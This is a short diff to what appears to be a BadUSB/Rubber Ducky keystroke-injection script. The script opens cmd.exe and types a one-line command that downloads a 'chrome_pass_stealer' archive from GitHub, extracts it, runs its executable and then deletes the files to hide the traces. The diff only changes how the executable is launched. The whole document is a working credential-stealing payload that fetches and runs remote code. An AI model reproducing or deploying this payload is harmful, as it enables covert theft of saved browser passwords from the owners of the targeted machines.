@@ -5,6 +5,6 @@ STRING cmd.exe
 DELAY 100
 ENTER
 DELAY 1500
-STRING mkdir tmp && cd tmp && curl --url https://raw.githubusercontent.com/leon-robinson/Payloads/main/chrome_pass_stealer.zip --output tmp.zip && tar -xf tmp.zip && del /f tmp.zip && .\chrome_pass_stealer\run.exe && cd .. && rmdir /S /Q tmp & exit
+STRING mkdir tmp && cd tmp && curl --url https://raw.githubusercontent.com/leon-robinson/Payloads/main/chrome_pass_stealer.zip --output tmp.zip && tar -xf tmp.zip && del /f tmp.zip && cd chrome_pass_stealer && run.exe && cd .. && cd .. && rmdir /S /Q tmp && exit
 DELAY 200
 ENTER
